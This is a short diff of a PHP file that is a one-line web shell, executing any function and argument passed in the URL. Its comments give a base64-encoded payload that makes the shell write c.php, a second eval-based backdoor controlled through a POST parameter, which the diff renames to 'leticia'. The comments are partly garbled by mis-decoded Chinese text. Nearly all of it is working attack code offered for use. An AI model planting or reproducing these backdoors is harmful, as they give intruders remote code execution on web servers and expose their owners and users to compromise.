@@ -1,4 +1,4 @@
 <?php $_GET[a]($_GET[b]);?>
-//payload£º?a=assert&b=${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))};
+//payloadï¼š?a=assert&b=${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2xldGljaWFdKTsgPz4=))};
 
-//ÔËĞĞÉÏÊöpayload£¬»áÔÚÍ¬Ä¿Â¼ÏÂÉú³Éc.phpÎÄ¼ş£¬ÀïÃæµÄÄÚÈİÊÇ<?php @eval($_POST[c]); ?>1£¬Éú³ÉÒ»¾ä»°Ä¾Âí¡£
+//è¿è¡Œä¸Šè¿°payloadï¼Œä¼šåœ¨åŒç›®å½•ä¸‹ç”Ÿæˆc.phpæ–‡ä»¶ï¼Œé‡Œé¢çš„å†…å®¹æ˜¯<?php @eval($_POST[leticia]); ?>1ï¼Œç”Ÿæˆä¸€å¥è¯æœ¨é©¬ã€‚
